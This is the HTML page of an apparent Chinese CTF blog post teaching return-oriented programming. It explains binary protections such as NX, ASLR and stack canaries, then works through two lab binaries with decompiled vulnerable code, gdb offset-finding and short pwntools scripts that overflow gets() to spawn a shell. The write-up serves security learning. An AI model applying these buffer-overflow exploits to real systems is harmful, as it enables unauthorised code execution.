@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ROP的基本原理和实战教学 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ROP的基本原理和实战教学"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ROP的基本原理和实战教学
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/" class="article-date">
+  <time datetime="2024-01-16T16:00:00.000Z" itemprop="datePublished">2024-01-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/Pwn/">Pwn</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">5 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="ROP的基本原理和实战教学"><a href="#ROP的基本原理和实战教学" class="headerlink" title="ROP的基本原理和实战教学"></a>ROP的基本原理和实战教学</h1><p>ROP的全称为Return-oriented   programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值</strong>，从而控制程序的执行流程。</p>
+<h2 id="二进制程序保护机制"><a href="#二进制程序保护机制" class="headerlink" title="二进制程序保护机制"></a>二进制程序保护机制</h2><p><strong>RELRO：</strong>Relocation Read-Only，<strong>重定位表只读</strong>。设置符号重定向表格为只读或在程序启动时就解析并绑 定所有动态符号，从而减少对 GOT 表的攻击。如果 RELRO 为“Partial RELRO”，说明对 GOT 表具有写权限。</p>
+<p>**Stack canary:**函数开始执行时先在栈帧基址 (如 EBP 位置) 附近插入 cookie 信息（标记），当函数返回后验证 cookie 信息是否合法， 如果不合法就停止程序运行。攻击者在执行溢出时，在覆盖返回地址的时候往往也会覆盖 cookie 信息，导致栈保护检查失败从而阻止 shellcode 的执行。</p>
+<p><strong>ASLR:<strong>Address Space Layout Randomization，</strong>地址空间布局随机化。</strong>通过对堆、栈、共享库等加载地址随机化，增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置。随机化影响的是程序加载的 基地址，页内偏移不会发生变化。</p>
+<p><strong>PIE: <strong>Position Independent Executable，</strong>地址无关的可执行文件</strong>，每次加载程序时都变换 text、 data、bss 等段的加载基地址，使得攻击者难以定位相应的基地址执行溢出。</p>
+<p><strong>NX:</strong>  NX(No-execute)是一种DEP数据执行保护技术，基本原理是将数据所在的内存标识为不可执行，当程序溢出成功后转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常不去执行恶意代码。</p>
+<h2 id="为什么要ROP？"><a href="#为什么要ROP？" class="headerlink" title="为什么要ROP？"></a>为什么要ROP？</h2><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就需要ROP对其进行绕过。</p>
+<h2 id="ROP靶场"><a href="#ROP靶场" class="headerlink" title="ROP靶场"></a>ROP靶场</h2><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h3><p>将返回地址覆盖到我们插入shellcode的首地址</p>
+<p>首先检测程序开启保护，防护措施几乎为0.</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118195205602.png" class title="image-20231118195205602">
+
+<p>反编译获取其源代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);<span class="comment">//行缓冲</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);<span class="comment">//全缓冲</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码使用gets()函数读取数据保存到v4中，我们来看看v4在栈中保存位置，在v4保存的100个数据后，接着有s和r这两寄存器，其中r代表rip指令寄存器，保存在函数调用前下一个指令的地址。</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118200438812.png" class title="image-20231118200438812">
+
+<p>代码还将字符串复制到buf2处，我们来跟进查看buf2在BSS段，地址为0804A080。BSS段通常是用来存放程序中未初始化或者初始化为0的全局变量和静态变量的一块内存区域。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure>
+
+
+
+<p>本题思路就是将payload写到buf2的地址，然后继续覆盖直至main()的返回地址覆盖为buf2的地址，这样rip保存的返回地址就跳到了此时buf2保存的payload，如下图：</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231118204315468.png" class title="image-20231118204315468">
+
+<p>payload构造方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcode代码+填充数据+buff2的地址</span><br></pre></td></tr></table></figure>
+
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成shellcode获取shell</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shellcode:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(shellcode))</span><br><span class="line">payload = shellcode+(<span class="number">112</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;a&#x27;</span>+p32(buf2)</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="shelltext"><a href="#shelltext" class="headerlink" title="shelltext"></a>shelltext</h3><p>该程序为32位ELF程序，并且只开启了NX保护,无法写入shellcode</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119095943596.png" class title="image-20231119095943596">
+
+<p>该程序反编译代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面的代码中可以看到，gets()存在溢出点，而且在secure()中存在system(“&#x2F;bin&#x2F;sh”)这一句执行系统命令开启shell，正在满足了无法执行shellcode的绕过，只需将system()的地址覆盖到rip寄存器保存的main()的返回地址，就能执行shell。</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119102458994.png" class title="image-20231119102458994">
+
+<p>可以看到system函数地址为0x0804863A</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119102604129.png" class title="image-20231119102604129">
+
+<p>在函数栈中，参数v4是100字节，s是保存的ebp为4字节，r是rip指令寄存器保存函数返回地址。这里我们是直接从函数栈中观察到的，但有时候不是很准确，所以还需使用动态调试去对溢出点进行验证。</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119103055753.png" class title="image-20231119103055753">
+
+<p>生成150个字符用作输入填充数据，使用gdb调试该程序并输入填充字符串运行，结果在0x62616164这个地址报错，这个地址就是溢出点</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119103748486.png" class title="image-20231119103748486">
+
+<p>输入点到eip的距离为112</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119105720897.png" class title="image-20231119105720897">
+
+<p>逆向代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行成功进入shell，可任意执行代码</p>
+<img src="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/image-20231119110123260.png" class title="image-20231119110123260">
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP-Pwn/" rel="tag">-ROP -Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            神经网络架构搜索
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">格式化字符串漏洞</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
